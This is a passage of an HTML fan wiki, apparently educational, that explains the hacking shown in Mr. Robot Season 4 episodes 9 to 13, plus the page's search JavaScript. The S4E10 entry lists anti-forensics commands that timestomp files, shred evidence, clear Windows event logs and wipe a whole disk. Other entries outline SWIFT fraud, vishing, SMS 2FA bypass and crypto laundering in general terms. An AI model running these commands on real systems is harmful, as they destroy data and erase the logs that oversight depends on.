+        <p>This is the <strong>centerpiece hack of Season 4</strong> and arguably the entire series. Elliot and Darlene execute a coordinated attack to drain the bank accounts of every member of the Deus Group during their meeting.</p>
+      </div>
+
+      <div class="hack-detail">
+        <h5>Phase 1: OSINT &amp; Target Enumeration</h5>
+        <p>Identifying every Deus Group member and mapping their financial infrastructure:</p>
+        <ul>
+          <li><strong>Financial Records:</strong> Cross-referencing leaked data, OSINT, and gathered intelligence</li>
+          <li><strong>Account Mapping:</strong> Identifying all bank accounts, shell companies, and trusts</li>
+          <li><strong>Target Bank:</strong> Cyprus National Bank identified as central financial node</li>
+        </ul>
+      </div>
+
+      <div class="hack-detail">
+        <h5>Phase 2: Cyprus National Bank SWIFT Compromise</h5>
+        <p>Compromising the banking infrastructure that holds the Deus Group's money by targeting <strong>SWIFT messaging terminals</strong>:</p>
+        <ul>
+          <li><strong>Target:</strong> SWIFT Alliance Access software on bank workstations</li>
+          <li><strong>Method:</strong> Network compromise + SWIFT terminal access</li>
+          <li><strong>Capability:</strong> Issue unauthorized wire transfer orders</li>
+        </ul>
+        <div class="real-world">The Bangladesh Bank heist (Feb 2016) used this exact technique. Attackers compromised SWIFT terminals at Bangladesh Bank and issued 35 fraudulent transfer requests totaling $951 million. $81 million was successfully transferred before a typo ("fandation" instead of "foundation") raised suspicions.</div>
+      </div>
+
+      <div class="hack-detail">
+        <h5>Phase 3: Man-in-the-Middle on Financial Transactions</h5>
+        <p>Real-time <strong>interception and modification</strong> of banking transactions, redirecting wire transfers to accounts controlled by Elliot.</p>
+      </div>
+
+      <div class="hack-detail">
+        <h5>Phase 4: Vishing (Voice Phishing) of Bank Staff</h5>
+        <p>Darlene makes phone calls <strong>impersonating authority figures</strong> to manipulate bank staff into authorizing transactions. Uses knowledge of internal bank procedures to appear legitimate.</p>
+      </div>
+
+      <div class="hack-detail">
+        <h5>Phase 5: 2FA Bypass via SS7/SMS Interception</h5>
+        <p>Bypassing <strong>two-factor authentication</strong> by intercepting SMS verification codes:</p>
+        <ul>
+          <li><strong>SS7 Exploitation:</strong> Exploiting telecom signaling protocol to intercept SMS</li>
+          <li><strong>SIM Swapping:</strong> Alternative method to hijack phone numbers</li>
+          <li><strong>Result:</strong> Complete bypass of SMS-based 2FA security</li>
+        </ul>
+      </div>
+
+      <div class="hack-detail">
+        <h5>Phase 6: Cryptocurrency Laundering</h5>
+        <p>Redirecting stolen funds through <strong>cryptocurrency</strong> to obscure the money trail:</p>
+        <ul>
+          <li><strong>Bitcoin Tumblers/Mixers:</strong> Break the transaction link between source and destination</li>
+          <li><strong>Monero (XMR):</strong> Privacy-focused cryptocurrency with built-in obfuscation</li>
+          <li><strong>Multi-Sig Wallets:</strong> Requiring multiple keys for fund access</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- S4E10 -->
+<div class="episode-card" id="s4e10">
+  <div class="ep-header" onclick="toggleEpBody(this)">
+    <span class="ep-number">10</span>
+    <div class="ep-title-area">
+      <h3>410 Gone</h3>
+      <div class="ep-filename">eps4.9_410gone.h</div>
+    </div>
+    <span class="ep-toggle">+</span>
+  </div>
+  <div class="ep-body">
+    <div class="tags">
+      <span class="tag attack">Wealth Redistribution</span>
+      <span class="tag attack">Anti-Forensics</span>
+      <span class="tag attack">Timestomping</span>
+    </div>
+    <div class="hack-section">
+      <h4>Hacks &amp; Techniques</h4>
+      <div class="hack-detail">
+        <h5>1. Automated Wealth Redistribution</h5>
+        <p>Automated scripts <strong>distribute stolen Deus Group funds</strong> to millions of bank accounts worldwide. The scale of the operation is unprecedented -- a Robin Hood-style wealth redistribution via code.</p>
+      </div>
+      <div class="hack-detail">
+        <h5>2. Comprehensive Anti-Forensics</h5>
+        <p>Covering all tracks after the hack:</p>
+        <div class="code-block"><span class="comment"># Timestomping (modify file timestamps to hide activity)</span>
+timestomp evidence.doc -m "01/01/2020 00:00:00"   <span class="comment"># Metasploit</span>
+touch -t 202001010000.00 /path/to/file              <span class="comment"># Linux</span>
+
+<span class="comment"># Secure file deletion</span>
+shred -vfz -n 7 /path/to/evidence_files
+
+<span class="comment"># Clear Windows Event Logs</span>
+wevtutil cl Security
+wevtutil cl System
+wevtutil cl Application
+
+<span class="comment"># Multi-pass disk wiping (DoD 5220.22-M standard)</span>
+nwipe --method=dodshort /dev/sda</div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- S4E11 -->
+<div class="episode-card" id="s4e11">
+  <div class="ep-header" onclick="toggleEpBody(this)">
+    <span class="ep-number">11</span>
+    <div class="ep-title-area">
+      <h3>411 Length Required / eXit</h3>
+      <div class="ep-filename">eps4.10_411lengthrequired.h</div>
+    </div>
+    <span class="ep-toggle">+</span>
+  </div>
+  <div class="ep-body">
+    <div class="tags">
+      <span class="tag attack">Air-Gapped Network</span>
+      <span class="tag attack">ICS/SCADA</span>
+      <span class="tag attack">Nuclear Facility</span>
+    </div>
+    <div class="hack-section">
+      <h4>Hacks &amp; Techniques</h4>
+      <div class="hack-detail">
+        <h5>1. Whiterose's Machine &amp; Industrial Control Systems</h5>
+        <p>The Washington Township power plant houses Whiterose's mysterious machine, controlled by <strong>large-scale industrial control systems</strong> -- the same class of systems targeted by Stuxnet.</p>
+      </div>
+      <div class="hack-detail">
+        <h5>2. Air-Gapped Network Breach</h5>
+        <p>Attempting to access systems that are <strong>physically isolated from the internet</strong>:</p>
+        <ul>
+          <li><strong>USB Bridging:</strong> Using removable media to cross the air gap</li>
+          <li><strong>TEMPEST:</strong> Capturing electromagnetic emanations from computer hardware</li>
+          <li><strong>Acoustic Side-Channel:</strong> Extracting data via audio signals from hardware</li>
+          <li><strong>Social Engineering:</strong> Convincing someone with physical access to bridge the gap</li>
+        </ul>
+        <div class="real-world">Stuxnet (2010) was the first known malware to successfully cross an air-gapped network. It spread via USB drives to reach the isolated Natanz uranium enrichment facility in Iran, ultimately destroying ~1,000 centrifuges by modifying Siemens PLC firmware.</div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- S4E12 -->
+<div class="episode-card" id="s4e12">
+  <div class="ep-header" onclick="toggleEpBody(this)">
+    <span class="ep-number">12</span>
+    <div class="ep-title-area">
+      <h3>412 Precondition Failed / whoami</h3>
+      <div class="ep-filename">eps4.11_412preconditionfailed.h</div>
+    </div>
+    <span class="ep-toggle">+</span>
+  </div>
+  <div class="ep-body">
+    <div class="tags">
+      <span class="tag tool">whoami</span>
+      <span class="tag attack">Identity Verification</span>
+    </div>
+    <div class="hack-section">
+      <h4>Hacks &amp; Techniques</h4>
+      <div class="hack-detail">
+        <h5>1. The whoami Command</h5>
+        <p>The episode's title references one of the <strong>first commands run after gaining access</strong> to a system -- determining who you are and what privileges you have:</p>
+        <div class="code-block"><span class="comment"># Linux/Unix identity commands</span>
+whoami              <span class="comment"># Current username</span>
+id                  <span class="comment"># UID, GID, groups</span>
+groups              <span class="comment"># Group memberships</span>
+sudo -l             <span class="comment"># Available sudo privileges</span>
+
+<span class="comment"># Windows identity commands</span>
+whoami              <span class="comment"># DOMAIN\username</span>
+whoami /all         <span class="comment"># Full identity info with privileges</span>
+whoami /priv        <span class="comment"># Current privilege tokens</span>
+net user %username% <span class="comment"># Detailed user information</span></div>
+      </div>
+      <div class="hack-detail">
+        <h5>2. Identity &amp; Access Management Themes</h5>
+        <p>This deeply psychological episode uses computing metaphors -- processes, identities, access controls -- to explore Elliot's dissociative identity. The "precondition failed" represents the failure of Elliot's constructed reality to meet the requirements of truth.</p>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- S4E13 -->
+<div class="episode-card" id="s4e13">
+  <div class="ep-header" onclick="toggleEpBody(this)">
+    <span class="ep-number">13</span>
+    <div class="ep-title-area">
+      <h3>413 Request Entity Too Large / Hello, Elliot (Series Finale)</h3>
+      <div class="ep-filename">eps4.12_413requestentitytoolarge.h</div>
+    </div>
+    <span class="ep-toggle">+</span>
+  </div>
+  <div class="ep-body">
+    <div class="tags">
+      <span class="tag attack">Kill Switch</span>
+      <span class="tag attack">SCRAM Procedure</span>
+      <span class="tag attack">ICS Prevention</span>
+    </div>
+    <div class="hack-section">
+      <h4>Hacks &amp; Techniques</h4>
+      <div class="hack-detail">
+        <h5>1. Whiterose's Machine -- Nuclear Facility ICS</h5>
+        <p>Elliot must <strong>disable Whiterose's machine</strong> before it causes a nuclear meltdown. He interfaces with the facility's industrial control systems to execute an <strong>emergency SCRAM</strong> (Safety Control Rod Axe Man) -- the emergency shutdown procedure for a nuclear reactor.</p>
+      </div>
+      <div class="hack-detail">
+        <h5>2. Malware Kill Switch</h5>
+        <p>Deploying a <strong>kill switch</strong> to neutralize rogue code controlling the facility.</p>
+        <div class="real-world">The WannaCry ransomware (May 2017) was stopped when security researcher Marcus Hutchins (@MalwareTech) discovered and activated its kill switch -- a hardcoded domain that, when registered and responding to HTTP requests, caused the malware to stop spreading. This single action prevented tens of billions of dollars in additional damage.</div>
+      </div>
+      <div class="hack-detail">
+        <h5>3. Post-Exploitation Cleanup &amp; Series Conclusion</h5>
+        <p>After the Deus Group hack succeeds, the stolen funds remain distributed due to <strong>blockchain immutability</strong> -- confirmed cryptocurrency transactions cannot be reversed. The series concludes with computing metaphors: Elliot's consciousness as a running process, the "Hello, Elliot" as a callback to "Hello, Friend" -- a system reboot of identity.</p>
+        <div class="code-block"><span class="comment"># The series, in code</span>
+$ whoami
+elliot
+
+$ echo "Hello, Friend"     <span class="comment"># eps1.0 - The beginning</span>
+$ echo "Hello, Elliot"      <span class="comment"># eps4.12 - The end</span>
+$ kill -9 $$                <span class="comment"># Terminate current process</span>
+$ shutdown -r now           <span class="comment"># Reboot. Start over.</span></div>
+      </div>
+    </div>
+  </div>
+</div>
+</div>
+
+</main>
+</div>
+
+<!-- FOOTER -->
+<footer class="footer">
+  <div class="credit">Created by Joas A Santos</div>
+  <p>Mr. Robot Hacking Wiki - A comprehensive technical reference for educational purposes</p>
+  <p>Technical advisors for the show: Ryan Kazanciyan (CrowdStrike/Tanium), Kor Adana (Writer/Tech Producer), Marc Rogers (DEF CON)</p>
+  <p class="disclaimer">DISCLAIMER: This content is for educational and research purposes only. All techniques described are based on the fictional TV series Mr. Robot and publicly documented security research. Do not use any of these techniques for unauthorized access to computer systems. Always obtain proper authorization before conducting security testing.</p>
+</footer>
+
+<!-- JAVASCRIPT -->
+<script>
+/* ======================== NAVIGATION ======================== */
+function toggleSeason(btn, listId) {
+  btn.classList.toggle('active');
+  document.getElementById(listId).classList.toggle('show');
+}
+
+function showEpisode(seasonId, epId, el) {
+  clearSearch();
+  document.querySelectorAll('.season-section').forEach(s => s.classList.remove('active'));
+  document.getElementById(seasonId).classList.add('active');
+  document.querySelectorAll('.ep-link').forEach(l => l.classList.remove('active'));
+  if (el) el.classList.add('active');
+  var card = document.getElementById(epId);
+  if (card) {
+    card.scrollIntoView({ behavior: 'smooth', block: 'start' });
+    var body = card.querySelector('.ep-body');
+    var toggle = card.querySelector('.ep-toggle');
+    if (body && !body.classList.contains('show')) {
+      body.classList.add('show');
+      if (toggle) toggle.classList.add('open');
+    }
+  }
+  document.querySelector('.sidebar').classList.remove('mobile-show');
+}
+
+function toggleEpBody(header) {
+  var body = header.nextElementSibling;
+  var toggle = header.querySelector('.ep-toggle');
+  body.classList.toggle('show');
+  toggle.classList.toggle('open');
+}
+
+/* ======================== SEARCH INDEX ======================== */
+var searchIndex = [];
+var activeFilters = new Set();
+
+function buildSearchIndex() {
+  searchIndex = [];
+  document.querySelectorAll('.episode-card').forEach(function(card) {
+    var id = card.id;
+    var seasonMatch = id.match(/^s(\d+)e(\d+)$/);
+    if (!seasonMatch) return;
+    var season = parseInt(seasonMatch[1]);
+    var episode = parseInt(seasonMatch[2]);
+    var header = card.querySelector('.ep-title-area');
+    var title = header ? header.querySelector('h3').textContent : '';
+    var filename = header ? (header.querySelector('.ep-filename') ? header.querySelector('.ep-filename').textContent : '') : '';
+    var body = card.querySelector('.ep-body');
+    var fullText = body ? body.textContent : '';
+    var tags = [];
+    card.querySelectorAll('.tag').forEach(function(t) {
+      tags.push({
+        text: t.textContent.trim().toLowerCase(),
+        type: t.classList.contains('tool') ? 'tool' :
+              t.classList.contains('attack') ? 'attack' :
+              t.classList.contains('social') ? 'social' :
+              t.classList.contains('hardware') ? 'hardware' : 'other'
+      });
+    });
+
+    var hacks = [];
+    card.querySelectorAll('.hack-detail').forEach(function(h) {
+      var h5 = h.querySelector('h5');
+      var p = h.querySelector('p');
+      hacks.push({
+        title: h5 ? h5.textContent : '',
+        desc: p ? p.textContent : '',
+        full: h.textContent
+      });
+    });
+
+    var codeBlocks = [];
+    card.querySelectorAll('.code-block').forEach(function(cb) {
+      codeBlocks.push(cb.textContent);
+    });
+
+    var realWorld = [];
+    card.querySelectorAll('.real-world').forEach(function(rw) {
+      realWorld.push(rw.textContent.replace('REAL-WORLD PARALLEL', '').trim());
+    });
+
+    // Extract MITRE ATT&CK IDs from content
+    var mitreIds = [];
+    var mitreRegex = /T\d{4}(?:\.\d{3})?/g;
+    var mitreMatches = fullText.match(mitreRegex);
+    if (mitreMatches) {
+      mitreIds = [...new Set(mitreMatches)];
+    }
+
+    searchIndex.push({
+      id: id,
+      season: season,
+      episode: episode,
+      seasonId: 's' + season,
+      title: title,
+      filename: filename,
+      tags: tags,
+      hacks: hacks,
+      codeBlocks: codeBlocks,
+      realWorld: realWorld,
+      mitreIds: mitreIds,
+      fullText: (title + ' ' + filename + ' ' + fullText).toLowerCase(),
+      tagTypes: tags.map(function(t) { return t.type; })
+    });
+  });
+}
+
+/* ======================== SEARCH ENGINE ======================== */
+var searchTimeout = null;
+
+function performSearch() {
+  var query = document.getElementById('search-input').value.trim().toLowerCase();
+  var resultsDiv = document.getElementById('search-results');
+  var clearBtn = document.getElementById('search-clear');
+
+  if (query.length > 0) {
+    clearBtn.classList.add('visible');
+  } else {
+    clearBtn.classList.remove('visible');
+  }
+
+  if (query.length < 2 && activeFilters.size === 0) {
+    resultsDiv.classList.remove('visible');
+    return;
+  }
+
+  var results = [];
+  var queryTerms = query.split(/\s+/).filter(function(t) { return t.length > 0; });
+
+  searchIndex.forEach(function(entry) {
+    // Apply season filters
+    var seasonFilters = [];
+    var typeFilters = [];
+    var mitreFilter = false;
+    activeFilters.forEach(function(f) {
+      if (f.match(/^s\d$/)) seasonFilters.push(parseInt(f.charAt(1)));
+      else if (f === 'mitre') mitreFilter = true;
+      else typeFilters.push(f);
+    });
+
+    if (seasonFilters.length > 0 && seasonFilters.indexOf(entry.season) === -1) return;
+    if (typeFilters.length > 0) {
+      var hasMatchingTag = typeFilters.some(function(tf) {
+        return entry.tagTypes.indexOf(tf) !== -1;
+      });
+      if (!hasMatchingTag) return;
+    }
+    if (mitreFilter && entry.mitreIds.length === 0) return;
+
+    // Text search
+    if (queryTerms.length === 0 && activeFilters.size > 0) {
+      results.push({ entry: entry, score: 1, matches: [] });
+      return;
+    }
+
+    var score = 0;
+    var matches = [];
+
+    queryTerms.forEach(function(term) {
+      // Title match (high priority)
+      if (entry.title.toLowerCase().indexOf(term) !== -1) {
+        score += 10;
+        matches.push({ type: 'title', text: entry.title });
+      }
+      // Filename match
+      if (entry.filename.toLowerCase().indexOf(term) !== -1) {
+        score += 8;
+      }
+      // Tag match (high priority)
+      entry.tags.forEach(function(tag) {
+        if (tag.text.indexOf(term) !== -1) {
+          score += 9;
+          matches.push({ type: 'tag', text: tag.text, tagType: tag.type });
+        }
+      });
+      // MITRE ID match
+      entry.mitreIds.forEach(function(mid) {
+        if (mid.toLowerCase().indexOf(term) !== -1) {
+          score += 9;
+          matches.push({ type: 'mitre', text: mid });
+        }
+      });
+      // Hack title match
+      entry.hacks.forEach(function(hack) {
+        if (hack.title.toLowerCase().indexOf(term) !== -1) {
+          score += 7;
+          matches.push({ type: 'hack', text: hack.title });
+        }
+        if (hack.desc.toLowerCase().indexOf(term) !== -1) {
+          score += 3;
+          // Extract context around match
+          var idx = hack.desc.toLowerCase().indexOf(term);
+          var start = Math.max(0, idx - 60);
+          var end = Math.min(hack.desc.length, idx + term.length + 60);
+          var snippet = (start > 0 ? '...' : '') + hack.desc.substring(start, end) + (end < hack.desc.length ? '...' : '');
+          matches.push({ type: 'desc', text: snippet, term: term });
+        }
+      });
+      // Code block match
+      entry.codeBlocks.forEach(function(cb) {
+        if (cb.toLowerCase().indexOf(term) !== -1) {
+          score += 4;
+          var idx = cb.toLowerCase().indexOf(term);
+          var start = Math.max(0, idx - 40);
+          var end = Math.min(cb.length, idx + term.length + 40);
+          var snippet = (start > 0 ? '...' : '') + cb.substring(start, end).replace(/\n/g, ' ') + (end < cb.length ? '...' : '');
+          matches.push({ type: 'code', text: snippet, term: term });
+        }
+      });
+      // Real-world match
+      entry.realWorld.forEach(function(rw) {
+        if (rw.toLowerCase().indexOf(term) !== -1) {
+          score += 3;
+          var idx = rw.toLowerCase().indexOf(term);
+          var start = Math.max(0, idx - 50);
+          var end = Math.min(rw.length, idx + term.length + 50);
+          var snippet = (start > 0 ? '...' : '') + rw.substring(start, end) + (end < rw.length ? '...' : '');
+          matches.push({ type: 'realworld', text: snippet, term: term });
+        }
+      });
+      // General full text match
+      if (entry.fullText.indexOf(term) !== -1 && score === 0) {
+        score += 1;
+        var idx = entry.fullText.indexOf(term);
+        var start = Math.max(0, idx - 60);
+        var end = Math.min(entry.fullText.length, idx + term.length + 60);
+        var snippet = (start > 0 ? '...' : '') + entry.fullText.substring(start, end) + (end < entry.fullText.length ? '...' : '');
+        matches.push({ type: 'text', text: snippet, term: term });
+      }
+    });
+
+    if (score > 0) {
+      results.push({ entry: entry, score: score, matches: matches });
+    }
+  });
+
+  // Sort by score descending
+  results.sort(function(a, b) { return b.score - a.score; });
+
+  renderResults(results, query);
+}
+
+function renderResults(results, query) {
+  var resultsDiv = document.getElementById('search-results');
+
+  if (results.length === 0) {
+    resultsDiv.innerHTML = '<div class="search-no-results"><div class="no-results-icon">&#9747;</div><p>No results found</p><p style="font-size:.75rem;margin-top:8px;color:var(--text2)">Try another term or adjust the filters</p></div>';
+    resultsDiv.classList.add('visible');
+    return;
+  }
+
+  var html = '<div class="search-results-header"><span class="results-count">' + results.length + ' result' + (results.length > 1 ? 's' : '') + ' found</span><span class="results-info">click to navigate</span></div>';
+
+  results.forEach(function(r) {
+    var e = r.entry;
+    var seasonLabel = 'S' + e.season + 'E' + (e.episode < 10 ? '0' : '') + e.episode;
+
+    html += '<div class="search-result-item" onclick="navigateToResult(\'' + e.seasonId + '\',\'' + e.id + '\')">';
+    html += '<div class="result-ep">' + seasonLabel + ' // ' + e.filename + '</div>';
+    html += '<div class="result-title">' + highlightText(e.title, query) + '</div>';
+
+    // Show best matches
+    var shownMatches = {};
+    var matchCount = 0;
+    r.matches.forEach(function(m) {
+      if (matchCount >= 3) return;
+      var key = m.type + ':' + m.text.substring(0, 30);
+      if (shownMatches[key]) return;
+      shownMatches[key] = true;
+      matchCount++;
+
+      if (m.type === 'tag') {
+        // Tags shown separately below
+      } else if (m.type === 'mitre') {
+        html += '<div class="result-match" style="color:#b478ff">MITRE ATT&CK: <mark>' + m.text + '</mark></div>';
+      } else if (m.type === 'hack') {
+        html += '<div class="result-match">' + highlightText(m.text, query) + '</div>';
+      } else if (m.type === 'code') {
+        html += '<div class="result-match" style="font-family:Share Tech Mono,monospace;font-size:.8rem;color:var(--green3)">' + highlightText(m.text, query) + '</div>';
+      } else if (m.text) {
+        html += '<div class="result-match">' + highlightText(m.text, query) + '</div>';
+      }
+    });
+
+    // Tags
+    html += '<div class="result-tags">';
+    e.tags.forEach(function(t) {
+      html += '<span class="tag ' + t.type + '">' + t.text + '</span>';
+    });
+    if (e.mitreIds.length > 0) {
+      e.mitreIds.slice(0, 4).forEach(function(mid) {
+        html += '<span class="tag" style="border-color:#b478ff;color:#b478ff;background:rgba(180,120,255,.05)">' + mid + '</span>';
+      });
+      if (e.mitreIds.length > 4) {
+        html += '<span class="tag" style="border-color:#b478ff;color:#b478ff;background:rgba(180,120,255,.05)">+' + (e.mitreIds.length - 4) + '</span>';
+      }
+    }
+    html += '</div>';
+    html += '</div>';
+  });
+
+  resultsDiv.innerHTML = html;
+  resultsDiv.classList.add('visible');
+}
+
+function highlightText(text, query) {
+  if (!query || query.length < 2) return escapeHtml(text);
+  var terms = query.split(/\s+/).filter(function(t) { return t.length > 0; });
+  var escaped = escapeHtml(text);
+  terms.forEach(function(term) {
+    var regex = new RegExp('(' + escapeRegex(escapeHtml(term)) + ')', 'gi');
+    escaped = escaped.replace(regex, '<mark>$1</mark>');
+  });
+  return escaped;
+}
+
+function escapeHtml(str) {
+  var div = document.createElement('div');
+  div.appendChild(document.createTextNode(str));
+  return div.innerHTML;
+}
+
+function escapeRegex(str) {
+  return str.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
+}
+
+function navigateToResult(seasonId, epId) {
+  document.getElementById('search-results').classList.remove('visible');
+  document.querySelectorAll('.season-section').forEach(function(s) { s.classList.remove('active'); });
+  document.getElementById(seasonId).classList.add('active');
+
+  // Update sidebar
+  document.querySelectorAll('.season-btn').forEach(function(btn) { btn.classList.remove('active'); });
+  document.querySelectorAll('.episode-list').forEach(function(el) { el.classList.remove('show'); });
+  var seasonNum = seasonId.charAt(1);
+  var listId = 's' + seasonNum + '-eps';
+  var list = document.getElementById(listId);
+  if (list) {
+    list.classList.add('show');
+    list.previousElementSibling.classList.add('active');
+  }
+  document.querySelectorAll('.ep-link').forEach(function(l) { l.classList.remove('active'); });
+
+  var card = document.getElementById(epId);
+  if (card) {
+    setTimeout(function() {
+      card.scrollIntoView({ behavior: 'smooth', block: 'start' });
+      var body = card.querySelector('.ep-body');
+      var toggle = card.querySelector('.ep-toggle');
+      if (body && !body.classList.contains('show')) {
+        body.classList.add('show');
+        if (toggle) toggle.classList.add('open');
+      }
+      // Flash effect
+      card.style.borderColor = 'var(--green)';
+      card.style.boxShadow = '0 0 20px rgba(0,255,65,.2)';
+      setTimeout(function() {
+        card.style.borderColor = '';
+        card.style.boxShadow = '';
+      }, 2000);
+    }, 100);
+  }
+}
+
+function toggleFilter(chip) {
+  var filter = chip.getAttribute('data-filter');
+  chip.classList.toggle('active');
+  if (activeFilters.has(filter)) {
+    activeFilters.delete(filter);
+  } else {
+    activeFilters.add(filter);
+  }
+  performSearch();
+}
+
+function clearSearch() {
+  document.getElementById('search-input').value = '';
+  document.getElementById('search-clear').classList.remove('visible');
+  document.getElementById('search-results').classList.remove('visible');
+  activeFilters.clear();
+  document.querySelectorAll('.filter-chip').forEach(function(c) { c.classList.remove('active'); });
+}
+
+/* ======================== EVENT LISTENERS ======================== */
+document.addEventListener('DOMContentLoaded', function() {
+  buildSearchIndex();
+
+  // Auto-open first episode
+  var firstBody = document.querySelector('.ep-body');
+  var firstToggle = document.querySelector('.ep-toggle');
+  if (firstBody) { firstBody.classList.add('show'); if (firstToggle) firstToggle.classList.add('open'); }
+
+  // Search input
+  var searchInput = document.getElementById('search-input');
+  searchInput.addEventListener('input', function() {
+    clearTimeout(searchTimeout);
+    searchTimeout = setTimeout(performSearch, 200);
+  });
+
+  searchInput.addEventListener('keydown', function(e) {
+    if (e.key === 'Escape') clearSearch();
+  });
+
+  // Ctrl+K shortcut
+  document.addEventListener('keydown', function(e) {
+    if ((e.ctrlKey || e.metaKey) && e.key === 'k') {
+      e.preventDefault();
+      searchInput.focus();
+      searchInput.select();
+    }
+    if (e.key === 'Escape') {
+      var resultsDiv = document.getElementById('search-results');
+      if (resultsDiv.classList.contains('visible')) {
+        clearSearch();
+      }
+    }
+  });
+});
+</script>
+</body>
+</html>
